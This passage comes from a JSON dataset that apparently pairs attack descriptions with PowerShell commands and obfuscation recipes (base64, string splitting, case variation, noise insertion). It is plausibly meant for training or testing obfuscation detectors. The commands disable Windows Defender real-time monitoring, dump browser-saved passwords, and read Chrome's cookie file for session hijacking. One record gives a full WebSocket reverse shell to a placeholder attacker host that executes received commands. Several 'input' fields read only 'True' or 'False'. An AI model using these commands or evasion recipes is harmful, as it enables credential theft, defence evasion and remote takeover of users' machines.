    "input": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "output": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Browser Saved Passwords, Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.",
    "origin_cmd": "Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\\temp\\browser_passwords.txt"
  },
  {
    "input": "List all namespaces (you may need administrator to list all of them) with WMI",
    "output": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "List all namespaces (you may need administrator to list all of them) with WMI",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "List all namespaces (you may need administrator to list all of them) with WMI",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "List all namespaces (you may need administrator to list all of them) with WMI",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "List all namespaces (you may need administrator to list all of them) with WMI",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "List all namespaces (you may need administrator to list all of them) with WMI",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "List all namespaces (you may need administrator to list all of them) with WMI",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "List all namespaces (you may need administrator to list all of them) with WMI",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "List all namespaces (you may need administrator to list all of them) with WMI",
    "origin_cmd": "Get-WmiObject -Class \"__Namespace\" -Namespace \"Root\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"
  },
  {
    "input": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "output": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieving Browser Cookies for Credential Theft, Accesses the Chrome browser's Cookies file, which can contain session cookies that might be exploited for session hijacking.",
    "origin_cmd": "$env:USERPROFILE + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' | Get-Item"
  },
  {
    "input": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "output": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "True",
